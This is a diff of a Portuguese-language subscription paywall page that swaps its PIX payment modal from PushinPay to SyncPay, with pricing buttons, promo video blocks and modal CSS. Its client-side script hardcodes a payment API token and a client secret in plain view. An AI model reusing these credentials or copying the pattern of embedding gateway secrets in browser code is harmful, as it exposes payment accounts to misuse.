-            <button onclick="redirecionar3()" class="pulsante btn btn-primary btn-lg btn-block modal-trigger btnPagamento" style="border-width: 2px; background-color: #ffa500; color: #fff;">
-                <span class="float-left ml-2"> Assinar (90 dias)  </span>
-                <span class="float-right mr-2"> R$ 59,90</span>
-            </button>
-        </div> <div class="row justify-content-center">
-                            <div class="is-12 mt-3">
-                                <div class="row text-center text-muted">
-                                    <div class="col-12">
-                                        <div class="font-15">
-                                            <span onclick="" style="cursor: pointer"> 744 posts </span>
-                                            <span class="ml-2 mr-2"> • </span>
-                                            <span onclick="" style="cursor: pointer"> 370 fotos </span>
-                                            <span class="ml-2 mr-2"> • </span>
-                                            <span onclick="" style="cursor: pointer"> 374 videos </span>
-                                        </div>
-    
-                                <div class="row videopostagem fullwidth" style="position: relative; width: 108%; overflow: hidden; border-radius: 10px;">
-                                    <!-- Vídeo de fundo -->
-                                    <video style="width: 100%; height: auto;" autoplay="" muted="" loop="" playsinline="">
-                                        <source src="https://res.cloudinary.com/ddcecxeoi/video/upload/v1760200153/SaveClip.App_AQPSy-gMF6wFmwRbCN5XGLPM_-BAjHRrmTSZMBtti1NXsCNBZOwYTv6I1cYePiefzX4JZCDTFl4H6eAQekWlDsTIhiulGemQ5rbcLHE_scqdyu.mp4">
-                                    </video>
-
-                                    <div class="overlay-content" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center; color: #fff; text-align: center;">
-                                        
-                                        <!-- Logotipo -->
-                                        <img class="col-12 imageAcima" src="images/logo_icon_branco.png" style="height: 20%; top: 38%;">
-                                        
-                                        <!-- Texto de contagem, abaixo do logotipo -->
-                                        <div class="col-12 row m-0" style="width: 100%; max-width: 500px; top: 60%;">
-                                            <div class="col-5 text-right">
-                                                <span class="text-light text-counts-profile">744 posts</span>
-                                            </div>
-                                            <div class="col-2 text-center">
-                                                <span class="text-light text-counts-profile"></span>
-                                            </div>
-                                            <div class="col-5 text-left">
-                                                <span class="text-light text-counts-profile">370k likes</span>
-                                            </div>
-                                        </div>
+                                        <h6 class="text-center font-weight-bold mb-4">
+                                            ASSINE AGORA</h6>
                                     </div>
-                                </div><br>
-                                <div class="row videopostagem fullwidth" style="position: relative; width: 108%; overflow: hidden; border-radius: 10px;">
-                                    <!-- Vídeo de fundo -->
-                                    <video style="width: 100%; height: auto;" autoplay="" muted="" loop="" playsinline="">
-                                        <source src="media/kamy02.mp4" type="video/mp4">
-                                    </video>
+                                    <!-- Plano 7 dias -->
+                                    <div class="col-12 mb-3">
+                                        <button onclick="redirecionar1()"
+                                            class="pulsante btn btn-primary btn-lg btn-block modal-trigger btnPagamento"
+                                            style="border-width: 2px; background-color: #ffa500; color: #fff;">
+                                            <span class="float-left ml-2"> Assinar (30 dias) </span>
+                                            <span class="float-right mr-2"> R$ 24,90</span>
+                                        </button>
+                                    </div>
 
-                                    <div class="overlay-content" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center; color: #fff; text-align: center;">
-                                        
-                                        <!-- Logotipo -->
-                                        <img class="col-12 imageAcima" src="images/logo_icon_branco.png" style="height: 20%; top: 38%;">
-                                        
-                                        <!-- Texto de contagem, abaixo do logotipo -->
-                                        <div class="col-12 row m-0" style="width: 100%; max-width: 500px; top: 60%;">
-                                            <div class="col-5 text-right">
-                                                <span class="text-light text-counts-profile">744 posts</span>
-                                            </div>
-                                            <div class="col-2 text-center">
-                                                <span class="text-light text-counts-profile"></span>
-                                            </div>
-                                            <div class="col-5 text-left">
-                                                <span class="text-light text-counts-profile">370k likes</span>
+                                    <!-- Plano 1 mês -->
+                                    <div class="col-12 mb-3">
+                                        <button onclick="redirecionar2()"
+                                            class="pulsante btn btn-primary btn-lg btn-block modal-trigger btnPagamento"
+                                            style="border-width: 2px; background-color: #ffa500; color: #fff;">
+                                            <span class="float-left ml-2"> Assinar (60 dias) </span>
+                                            <span class="float-right mr-2"> R$ 39,90 </span>
+                                        </button>
+                                    </div>
+
+                                    <!-- Plano 3 meses -->
+                                    <div class="col-12">
+                                        <button onclick="redirecionar3()"
+                                            class="pulsante btn btn-primary btn-lg btn-block modal-trigger btnPagamento"
+                                            style="border-width: 2px; background-color: #ffa500; color: #fff;">
+                                            <span class="float-left ml-2"> Assinar (90 dias) </span>
+                                            <span class="float-right mr-2"> R$ 59,90</span>
+                                        </button>
+                                    </div>
+                                    <div class="row justify-content-center">
+                                        <div class="is-12 mt-3">
+                                            <div class="row text-center text-muted">
+                                                <div class="col-12">
+                                                    <div class="font-15">
+                                                        <span onclick="" style="cursor: pointer"> 744 posts </span>
+                                                        <span class="ml-2 mr-2"> • </span>
+                                                        <span onclick="" style="cursor: pointer"> 370 fotos </span>
+                                                        <span class="ml-2 mr-2"> • </span>
+                                                        <span onclick="" style="cursor: pointer"> 374 videos </span>
+                                                    </div>
+
+                                                    <div class="row videopostagem fullwidth"
+                                                        style="position: relative; width: 108%; overflow: hidden; border-radius: 10px;">
+                                                        <!-- Vídeo de fundo -->
+                                                        <video style="width: 100%; height: auto;" autoplay="" muted=""
+                                                            loop="" playsinline="">
+                                                            <source
+                                                                src="https://res.cloudinary.com/ddcecxeoi/video/upload/v1760200153/SaveClip.App_AQPSy-gMF6wFmwRbCN5XGLPM_-BAjHRrmTSZMBtti1NXsCNBZOwYTv6I1cYePiefzX4JZCDTFl4H6eAQekWlDsTIhiulGemQ5rbcLHE_scqdyu.mp4">
+                                                        </video>
+
+                                                        <div class="overlay-content"
+                                                            style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center; color: #fff; text-align: center;">
+
+                                                            <!-- Logotipo -->
+                                                            <img class="col-12 imageAcima"
+                                                                src="images/logo_icon_branco.png"
+                                                                style="height: 20%; top: 38%;">
+
+                                                            <!-- Texto de contagem, abaixo do logotipo -->
+                                                            <div class="col-12 row m-0"
+                                                                style="width: 100%; max-width: 500px; top: 60%;">
+                                                                <div class="col-5 text-right">
+                                                                    <span class="text-light text-counts-profile">744
+                                                                        posts</span>
+                                                                </div>
+                                                                <div class="col-2 text-center">
+                                                                    <span class="text-light text-counts-profile"></span>
+                                                                </div>
+                                                                <div class="col-5 text-left">
+                                                                    <span class="text-light text-counts-profile">370k
+                                                                        likes</span>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div><br>
+                                                    <div class="row videopostagem fullwidth"
+                                                        style="position: relative; width: 108%; overflow: hidden; border-radius: 10px;">
+                                                        <!-- Vídeo de fundo -->
+                                                        <video style="width: 100%; height: auto;" autoplay="" muted=""
+                                                            loop="" playsinline="">
+                                                            <source src="media/kamy02.mp4" type="video/mp4">
+                                                        </video>
+
+                                                        <div class="overlay-content"
+                                                            style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center; color: #fff; text-align: center;">
+
+                                                            <!-- Logotipo -->
+                                                            <img class="col-12 imageAcima"
+                                                                src="images/logo_icon_branco.png"
+                                                                style="height: 20%; top: 38%;">
+
+                                                            <!-- Texto de contagem, abaixo do logotipo -->
+                                                            <div class="col-12 row m-0"
+                                                                style="width: 100%; max-width: 500px; top: 60%;">
+                                                                <div class="col-5 text-right">
+                                                                    <span class="text-light text-counts-profile">744
+                                                                        posts</span>
+                                                                </div>
+                                                                <div class="col-2 text-center">
+                                                                    <span class="text-light text-counts-profile"></span>
+                                                                </div>
+                                                                <div class="col-5 text-left">
+                                                                    <span class="text-light text-counts-profile">370k
+                                                                        likes</span>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+
+                                                    <br>
+                                                    <div class="row videopostagem fullwidth">
+                                                        <img class="col-12 imageAcima" src="images/logo_icon_branco.png"
+                                                            style="height: 20%; top: 38%;">
+                                                        <div class="col-12 imageAcima" style="top: 52%">
+                                                            <div class="col-12 row m-0" style="top: 100%">
+                                                                <div class="col-5 text-right">
+                                                                    <span class="text-light text-counts-profile">744
+                                                                        posts</span>
+                                                                </div>
+                                                                <div class="col-2 text-center">
+                                                                    <span class="text-light text-counts-profile"></span>
+                                                                </div>
+                                                                <div class="col-5 text-left">
+                                                                    <span class="text-light text-counts-profile">370k
+                                                                        likes</span>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                        <img src="images/blur_7.jpg" alt="" class="rounded">
+                                                    </div>
+                                                    <script defer=""
+                                                        src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015"
+                                                        data-cf-beacon="{"
+                                                        rayid":"9027be15bfa7fba7","version":"2025.1.0","r":1,"token":"2b42f34d6100447897d5ffafc0015597","servertiming":{"name":{"cfextpri":true,"cfl4":true,"cfspeedbrain":true,"cfcachestatus":true}}}"=""
+                                                        crossorigin="anonymous"></script>
+                                                </div>
                                             </div>
                                         </div>
                                     </div>
                                 </div>
-    
-                                <br>
-                                    <div class="row videopostagem fullwidth">
-                                        <img class="col-12 imageAcima" src="images/logo_icon_branco.png" style="height: 20%; top: 38%;">
-                                        <div class="col-12 imageAcima" style="top: 52%">
-                                            <div class="col-12 row m-0" style="top: 100%">
-                                                <div class="col-5 text-right">
-                                                    <span class="text-light text-counts-profile">744 posts</span>
-                                                </div>
-                                                <div class="col-2 text-center">
-                                                    <span class="text-light text-counts-profile"></span>
-                                                </div>
-                                                <div class="col-5 text-left">
-                                                    <span class="text-light text-counts-profile">370k likes</span>
-                                                </div>
-                                            </div>
-                                        </div>
-                                        <img src="images/blur_7.jpg" alt="" class="rounded">
-                                    </div>
-                                    <script defer="" src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" data-cf-beacon="{" rayid":"9027be15bfa7fba7","version":"2025.1.0","r":1,"token":"2b42f34d6100447897d5ffafc0015597","servertiming":{"name":{"cfextpri":true,"cfl4":true,"cfspeedbrain":true,"cfcachestatus":true}}}"="" crossorigin="anonymous"></script>
-</div></div></div></div></div></div></div></div></div></div></div></div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
 
-             <!-- ADICIONE ESTE CÓDIGO NO FINAL DO SEU HTML, ANTES DO </body> -->
+    <!-- ADICIONE ESTE CÓDIGO NO FINAL DO SEU HTML, ANTES DO </body> -->
 
-<!-- CSS do Modal PIX -->
-<style>
-    .modal-pix-pushin {
-        display: none;
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        background: rgba(0, 0, 0, 0.92);
-        z-index: 999999;
-        align-items: center;
-        justify-content: center;
-        animation: fadeInModal 0.3s ease;
-        overflow-y: auto;
-        padding: 10px;
-    }
-
-    .modal-pix-pushin.active {
-        display: flex;
-    }
-
-    .modal-pix-content-pushin {
-        background: white;
-        padding: 20px;
-        border-radius: 15px;
-        max-width: 380px;
-        width: 95%;
-        max-height: 95vh;
-        overflow-y: auto;
-        text-align: center;
-        position: relative;
-        animation: slideUpModal 0.4s ease;
-        box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
-    }
-
-    .close-modal-pix-pushin {
-        position: absolute;
-        top: 10px;
-        right: 10px;
-        background: #ff4757;
-        color: white;
-        border: none;
-        width: 32px;
-        height: 32px;
-        border-radius: 50%;
-        cursor: pointer;
-        font-size: 20px;
-        font-weight: bold;
-        transition: all 0.3s;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        line-height: 1;
-        z-index: 10;
-    }
-
-    .close-modal-pix-pushin:hover {
-        background: #ff3838;
-        transform: rotate(90deg);
-    }
-
-    .modal-pix-pushin h2 {
-        color: #2c3e50;
-        font-size: 20px;
-        margin-bottom: 8px;
-        font-weight: bold;
-    }
-
-    .valor-pix-pushin {
-        color: #ffa500;
-        font-size: 32px;
-        font-weight: bold;
-        margin: 10px 0;
-    }
-
-    .status-pix-pushin {
-        display: inline-block;
-        padding: 6px 16px;
-        border-radius: 20px;
-        font-size: 12px;
-        font-weight: 600;
-        margin-bottom: 15px;
-    }
-
-    .status-pix-pushin.pendente {
-        background: #fff3cd;
-        color: #856404;
-    }
-
-    .status-pix-pushin.pago {
-        background: #d4edda;
-        color: #155724;
-    }
-
-    .qr-code-box-pushin {
-        margin: 15px 0;
-        padding: 15px;
-        background: linear-gradient(135deg, #ffa500 0%, #ff8c00 100%);
-        border-radius: 12px;
-    }
-
-    .qr-code-box-pushin img {
-        width: 200px;
-        height: 200px;
-        background: white;
-        padding: 10px;
-        border-radius: 10px;
-        box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
-    }
-
-    .instrucoes-pix-pushin {
-        background: #f8f9fa;
-        padding: 12px;
-        border-radius: 8px;
-        margin: 12px 0;
-        text-align: left;
-    }
-
-    .instrucoes-pix-pushin h3 {
-        color: #495057;
-        font-size: 14px;
-        margin-bottom: 8px;
-        font-weight: bold;
-    }
-
-    .instrucoes-pix-pushin ol {
-        margin: 0;
-        padding-left: 18px;
-        color: #6c757d;
-        font-size: 12px;
-        line-height: 1.6;
-    }
-
-    .codigo-pix-container-pushin {
-        margin: 12px 0;
-    }
-
-    .codigo-pix-label-pushin {
-        color: #495057;
-        font-size: 12px;
-        font-weight: 600;
-        margin-bottom: 8px;
-        display: block;
-    }
-
-    .codigo-pix-box-pushin {
-        background: #f8f9fa;
-        border: 2px dashed #dee2e6;
-        padding: 10px;
-        border-radius: 8px;
-        word-break: break-all;
-        font-family: 'Courier New', monospace;
-        font-size: 10px;
-        color: #495057;
-        max-height: 80px;
-        overflow-y: auto;
-        text-align: left;
-        line-height: 1.4;
-    }
-
-    .btn-copiar-pix-pushin {
-        background: linear-gradient(135deg, #ffa500 0%, #ff8c00 100%);
-        color: white;
-        border: none;
-        padding: 12px 30px;
-        border-radius: 50px;
-        font-size: 14px;
-        font-weight: bold;
-        cursor: pointer;
-        width: 100%;
-        margin-top: 10px;
-        transition: all 0.3s;
-        box-shadow: 0 6px 15px rgba(255, 165, 0, 0.4);
-    }
-
-    .btn-copiar-pix-pushin:hover {
-        transform: translateY(-2px);
-        box-shadow: 0 10px 25px rgba(255, 165, 0, 0.6);
-    }
-
-    .btn-copiar-pix-pushin:active {
-        transform: translateY(0);
-    }
-
-    .btn-verificar-pix-pushin {
-        background: linear-gradient(135deg, #27ae60 0%, #229954 100%);
-        color: white;
-        border: none;
-        padding: 12px 30px;
-        border-radius: 50px;
-        font-size: 14px;
-        font-weight: bold;
-        cursor: pointer;
-        width: 100%;
-        margin-top: 8px;
-        transition: all 0.3s;
-        box-shadow: 0 6px 15px rgba(39, 174, 96, 0.4);
-    }
-
-    .btn-verificar-pix-pushin:hover {
-        transform: translateY(-2px);
-        box-shadow: 0 10px 25px rgba(39, 174, 96, 0.6);
-    }
-
-    .btn-verificar-pix-pushin:disabled {
-        opacity: 0.6;
-        cursor: not-allowed;
-        transform: none;
-    }
-
-    .aviso-tempo-pushin {
-        color: #6c757d;
-        font-size: 11px;
-        margin-top: 12px;
-        padding: 10px;
-        background: #e9ecef;
-        border-radius: 6px;
-    }
-
-    .loading-pix-pushin {
-        display: inline-block;
-        width: 40px;
-        height: 40px;
-        border: 4px solid #f3f3f3;
-        border-top: 4px solid #ffa500;
-        border-radius: 50%;
-        animation: spinLoader 1s linear infinite;
-        margin: 20px 0;
-    }
-
-    .toast-message-pushin {
-        position: fixed;
-        top: 20px;
-        left: 50%;
-        transform: translateX(-50%) translateY(-100px);
-        background: #27ae60;
-        color: white;
-        padding: 12px 24px;
-        border-radius: 50px;
-        font-weight: 600;
-        font-size: 14px;
-        z-index: 1000000;
-        box-shadow: 0 8px 20px rgba(39, 174, 96, 0.4);
-        opacity: 0;
-        transition: all 0.4s ease;
-    }
-
-    .toast-message-pushin.show {
-        transform: translateX(-50%) translateY(0);
-        opacity: 1;
-    }
-
-    .toast-message-pushin.error {
-        background: #e74c3c;
-    }
-
-    @keyframes fadeInModal {
-        from { opacity: 0; }
-        to { opacity: 1; }
-    }
-
-    @keyframes slideUpModal {
-        from { 
-            transform: translateY(30px); 
-            opacity: 0; 
-        }
-        to { 
-            transform: translateY(0); 
-            opacity: 1; 
-        }
-    }
-
-    @keyframes spinLoader {
-        0% { transform: rotate(0deg); }
-        100% { transform: rotate(360deg); }
-    }
-
-    /* Responsivo Mobile */
-    @media (max-width: 480px) {
-        .modal-pix-content-pushin {
-            padding: 15px;
-            max-width: 95%;
-            border-radius: 12px;
-        }
-
-        .qr-code-box-pushin img {
-            width: 180px;
-            height: 180px;
-            padding: 8px;
-        }
-
-        .valor-pix-pushin {
-            font-size: 28px;
-        }
-
-        .modal-pix-pushin h2 {
-            font-size: 18px;
-        }
-
-        .instrucoes-pix-pushin {
+    <!-- CSS do Modal PIX -->
+    <style>
+        .modal-pix-syncpay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.92);
+            z-index: 999999;
+            align-items: center;
+            justify-content: center;
+            animation: fadeInModal 0.3s ease;
+            overflow-y: auto;
             padding: 10px;
         }
 
-        .instrucoes-pix-pushin ol {
+        .modal-pix-syncpay.active {
+            display: flex;
+        }
+
+        .modal-pix-content-syncpay {
+            background: white;
+            padding: 20px;
+            border-radius: 15px;
+            max-width: 380px;
+            width: 95%;
+            max-height: 95vh;
+            overflow-y: auto;
+            text-align: center;
+            position: relative;
+            animation: slideUpModal 0.4s ease;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+        }
+
+        .close-modal-pix-syncpay {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: #ff4757;
+            color: white;
+            border: none;
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            cursor: pointer;
+            font-size: 20px;
+            font-weight: bold;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            line-height: 1;
+            z-index: 10;
+        }
+
+        .close-modal-pix-syncpay:hover {
+            background: #ff3838;
+            transform: rotate(90deg);
+        }
+
+        .modal-pix-syncpay h2 {
+            color: #2c3e50;
+            font-size: 20px;
+            margin-bottom: 8px;
+            font-weight: bold;
+        }
+
+        .valor-pix-syncpay {
+            color: #ffa500;
+            font-size: 32px;
+            font-weight: bold;
+            margin: 10px 0;
+        }
+
+        .status-pix-syncpay {
+            display: inline-block;
+            padding: 6px 16px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+            margin-bottom: 15px;
+        }
+
+        .status-pix-syncpay.pendente {
+            background: #fff3cd;
+            color: #856404;
+        }
+
+        .status-pix-syncpay.pago {
+            background: #d4edda;
+            color: #155724;
+        }
+
+        .qr-code-box-syncpay {
+            margin: 15px 0;
+            padding: 15px;
+            background: linear-gradient(135deg, #ffa500 0%, #ff8c00 100%);
+            border-radius: 12px;
+        }
+
+        .qr-code-box-syncpay img {
+            width: 200px;
+            height: 200px;
+            background: white;
+            padding: 10px;
+            border-radius: 10px;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
+        }
+
+        .instrucoes-pix-syncpay {
+            background: #f8f9fa;
+            padding: 12px;
+            border-radius: 8px;
+            margin: 12px 0;
+            text-align: left;
+        }
+
+        .instrucoes-pix-syncpay h3 {
+            color: #495057;
+            font-size: 14px;
+            margin-bottom: 8px;
+            font-weight: bold;
+        }
+
+        .instrucoes-pix-syncpay ol {
+            margin: 0;
+            padding-left: 18px;
+            color: #6c757d;
+            font-size: 12px;
+            line-height: 1.6;
+        }
+
+        .codigo-pix-container-syncpay {
+            margin: 12px 0;
+        }
+
+        .codigo-pix-label-syncpay {
+            color: #495057;
+            font-size: 12px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            display: block;
+        }
+
+        .codigo-pix-box-syncpay {
+            background: #f8f9fa;
+            border: 2px dashed #dee2e6;
+            padding: 10px;
+            border-radius: 8px;
+            word-break: break-all;
+            font-family: 'Courier New', monospace;
+            font-size: 10px;
+            color: #495057;
+            max-height: 80px;
+            overflow-y: auto;
+            text-align: left;
+            line-height: 1.4;
+        }
+
+        .btn-copiar-pix-syncpay {
+            background: linear-gradient(135deg, #ffa500 0%, #ff8c00 100%);
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 50px;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 10px;
+            transition: all 0.3s;
+            box-shadow: 0 6px 15px rgba(255, 165, 0, 0.4);
+        }
+
+        .btn-copiar-pix-syncpay:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(255, 165, 0, 0.6);
+        }
+
+        .btn-copiar-pix-syncpay:active {
+            transform: translateY(0);
+        }
+
+        .btn-verificar-pix-syncpay {
+            background: linear-gradient(135deg, #27ae60 0%, #229954 100%);
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 50px;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 8px;
+            transition: all 0.3s;
+            box-shadow: 0 6px 15px rgba(39, 174, 96, 0.4);
+        }
+
+        .btn-verificar-pix-syncpay:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(39, 174, 96, 0.6);
+        }
+
+        .btn-verificar-pix-syncpay:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .aviso-tempo-syncpay {
+            color: #6c757d;
             font-size: 11px;
+            margin-top: 12px;
+            padding: 10px;
+            background: #e9ecef;
+            border-radius: 6px;
         }
 
-        .codigo-pix-box-pushin {
-            font-size: 9px;
-            max-height: 70px;
+        .loading-pix-syncpay {
+            display: inline-block;
+            width: 40px;
+            height: 40px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #ffa500;
+            border-radius: 50%;
+            animation: spinLoader 1s linear infinite;
+            margin: 20px 0;
         }
 
-        .btn-copiar-pix-pushin,
-        .btn-verificar-pix-pushin {
-            padding: 10px 24px;
-            font-size: 13px;
+        .toast-message-syncpay {
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%) translateY(-100px);
+            background: #27ae60;
+            color: white;
+            padding: 12px 24px;
+            border-radius: 50px;
+            font-weight: 600;
+            font-size: 14px;
+            z-index: 1000000;
+            box-shadow: 0 8px 20px rgba(39, 174, 96, 0.4);
+            opacity: 0;
+            transition: all 0.4s ease;
         }
-    }
 
-    /* Scrollbar customizada para o modal */
-    .modal-pix-content-pushin::-webkit-scrollbar {
-        width: 6px;
-    }
+        .toast-message-syncpay.show {
+            transform: translateX(-50%) translateY(0);
+            opacity: 1;
+        }
 
-    .modal-pix-content-pushin::-webkit-scrollbar-track {
-        background: #f1f1f1;
-        border-radius: 10px;
-    }
+        .toast-message-syncpay.error {
+            background: #e74c3c;
+        }
 
-    .modal-pix-content-pushin::-webkit-scrollbar-thumb {
-        background: #ffa500;
-        border-radius: 10px;
-    }
+        @keyframes fadeInModal {
+            from {
+                opacity: 0;
+            }
 
-    .modal-pix-content-pushin::-webkit-scrollbar-thumb:hover {
-        background: #ff8c00;
-    }
+            to {
+                opacity: 1;
+            }
+        }
 
-    .codigo-pix-box-pushin::-webkit-scrollbar {
-        width: 4px;
-    }
+        @keyframes slideUpModal {
+            from {
+                transform: translateY(30px);
+                opacity: 0;
+            }
 
-    .codigo-pix-box-pushin::-webkit-scrollbar-track {
-        background: #e9ecef;
-    }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
 
-    .codigo-pix-box-pushin::-webkit-scrollbar-thumb {
-        background: #dee2e6;
-        border-radius: 4px;
-    }
-</style>
+        @keyframes spinLoader {
+            0% {
+                transform: rotate(0deg);
+            }
 
-<!-- Modal PIX -->
-<div class="modal-pix-pushin" id="modalPixPushin">
-    <div class="modal-pix-content-pushin">
-        <button class="close-modal-pix-pushin" onclick="fecharModalPixPushin()">×</button>
-        <div id="conteudoPixModalPushin"></div>
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* Responsivo Mobile */
+        @media (max-width: 480px) {
+            .modal-pix-content-syncpay {
+                padding: 15px;
+                max-width: 95%;
+                border-radius: 12px;
+            }
+
+            .qr-code-box-syncpay img {
+                width: 180px;
+                height: 180px;
+                padding: 8px;
+            }
+
+            .valor-pix-syncpay {
+                font-size: 28px;
+            }
+
+            .modal-pix-syncpay h2 {
+                font-size: 18px;
+            }
+
+            .instrucoes-pix-syncpay {
+                padding: 10px;
+            }
+
+            .instrucoes-pix-syncpay ol {
+                font-size: 11px;
+            }
+
+            .codigo-pix-box-syncpay {
+                font-size: 9px;
+                max-height: 70px;
+            }
+
+            .btn-copiar-pix-syncpay,
+            .btn-verificar-pix-syncpay {
+                padding: 10px 24px;
+                font-size: 13px;
+            }
+        }
+
+        /* Scrollbar customizada para o modal */
+        .modal-pix-content-syncpay::-webkit-scrollbar {
+            width: 6px;
+        }
+
+        .modal-pix-content-syncpay::-webkit-scrollbar-track {
+            background: #f1f1f1;
+            border-radius: 10px;
+        }
+
+        .modal-pix-content-syncpay::-webkit-scrollbar-thumb {
+            background: #ffa500;
+            border-radius: 10px;
+        }
+
+        .modal-pix-content-syncpay::-webkit-scrollbar-thumb:hover {
+            background: #ff8c00;
+        }
+
+        .codigo-pix-box-syncpay::-webkit-scrollbar {
+            width: 4px;
+        }
+
+        .codigo-pix-box-syncpay::-webkit-scrollbar-track {
+            background: #e9ecef;
+        }
+
+        .codigo-pix-box-syncpay::-webkit-scrollbar-thumb {
+            background: #dee2e6;
+            border-radius: 4px;
+        }
+    </style>
+
+    <!-- Modal PIX -->
+    <div class="modal-pix-syncpay" id="modalPixSyncpay">
+        <div class="modal-pix-content-syncpay">
+            <button class="close-modal-pix-syncpay" onclick="fecharModalPixSyncpay()">×</button>
+            <div id="conteudoPixModalSyncpay"></div>
+        </div>
     </div>
-</div>
 
-<div class="toast-message-pushin" id="toastMessagePushin"></div>
+    <div class="toast-message-syncpay" id="toastMessageSyncpay"></div>
 
-<!-- Script de Integração PushinPay -->
-<script>
-    // ⚠️ IMPORTANTE: Substitua pelo seu TOKEN da PushinPay
-    const PUSHINPAY_TOKEN = '49866|p2SlIlHOsm3KzfcqsCD98g31b2K0B5BfneUjTzbW56afb743';
-    
-    // URLs da API
-    //const API_BASE_URL_PUSHIN = 'https://api-sandbox.pushinpay.com.br'; // Sandbox (testes)
-  const API_BASE_URL_PUSHIN = 'https://api.pushinpay.com.br/api/pix'; // Produção (descomente quando for usar)
-    
-    const API_URL_PUSHIN = `${API_BASE_URL_PUSHIN}/cashIn`;
-    
-    // URL do webhook (opcional)
-    const WEBHOOK_URL_PUSHIN = ''; // Ex: 'https://seu-site.com/webhook'
+    <!-- Script de Integração SyncPay -->
+    <script>
+        // ⚠️ IMPORTANTE: Configure suas credenciais da SyncPay aqui
+        const SYNCPAY_CLIENT_ID = '2b29d858-b24d-49cf-ae94-4871d8014a7f';
+        const SYNCPAY_CLIENT_SECRET = '0e8961a5-dc6b-4c89-aa28-5244546b0a7d';
 
-    // Variáveis globais
-    let pagamentoAtualPushin = null;
-    let intervaloVerificacaoPushin = null;
-    let ultimaConsultaPushin = 0;
+        // URL Base da API da SyncPay (altere se for usar sandbox)
+        const API_BASE_URL_SYNCPAY = 'https://api.syncpay.com.br';
+        const API_URL_CASHIN = `${API_BASE_URL_SYNCPAY}/api/partner/v1/cash-in`;
+        const API_URL_AUTH = `${API_BASE_URL_SYNCPAY}/api/partner/v1/auth-token`;
 
-    // Função para criar pagamento PIX
-    async function criarPagamentoPixPushin(valor, descricao) {
-        const modal = document.getElementById('modalPixPushin');
-        const conteudo = document.getElementById('conteudoPixModalPushin');
-        
-        // Abre o modal com loading
-        modal.classList.add('active');
-        document.body.style.overflow = 'hidden'; // Bloqueia scroll da página
-        
-        conteudo.innerHTML = `
+        // URL do webhook (opcional)
+        const WEBHOOK_URL_SYNCPAY = '';
+
+        // Variáveis globais
+        let pagamentoAtualSyncpay = null;
+        let intervaloVerificacaoSyncpay = null;
+        let ultimaConsultaSyncpay = 0;
+
+        // Função para obter o Bearer Token com cache local de 1 hora
+        async function obterTokenSyncpay() {
+            const tokenCached = localStorage.getItem('syncpay_token');
+            const tokenExpires = localStorage.getItem('syncpay_token_expires');
+
+            // Se o token existe e ainda é válido (com margem de segurança de 5 minutos)
+            if (tokenCached && tokenExpires && Date.now() < (parseInt(tokenExpires) - 300000)) {
+                return tokenCached;
+            }
+
+            try {
+                const response = await fetch(API_URL_AUTH, {
+                    method: 'POST',
+                    headers: {
+                        'Accept': 'application/json',
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        client_id: SYNCPAY_CLIENT_ID,
+                        client_secret: SYNCPAY_CLIENT_SECRET
+                    })
+                });
+
+                const data = await response.json();
+
+                if (response.ok && data.access_token) {
+                    const expiresAt = Date.now() + (data.expires_in * 1000);
+                    localStorage.setItem('syncpay_token', data.access_token);
+                    localStorage.setItem('syncpay_token_expires', expiresAt.toString());
+                    return data.access_token;
+                } else {
+                    throw new Error(data.message || 'Falha ao autenticar na SyncPay');
+                }
+            } catch (error) {
+                console.error('Erro de autenticação SyncPay:', error);
+                throw new Error('Erro na autenticação com o gateway de pagamentos. Verifique as credenciais.');
+            }
+        }
+
+        // Função para criar pagamento PIX
+        async function criarPagamentoPixSyncpay(valor, descricao) {
+            const modal = document.getElementById('modalPixSyncpay');
+            const conteudo = document.getElementById('conteudoPixModalSyncpay');
+
+            // Abre o modal com loading
+            modal.classList.add('active');
+            document.body.style.overflow = 'hidden'; // Bloqueia scroll da página
+
+            conteudo.innerHTML = `
             <h2>Gerando PIX...</h2>
-            <div class="loading-pix-pushin"></div>
+            <div class="loading-pix-syncpay"></div>
             <p style="color: #6c757d; margin-top: 20px;">Aguarde alguns segundos</p>
         `;
 
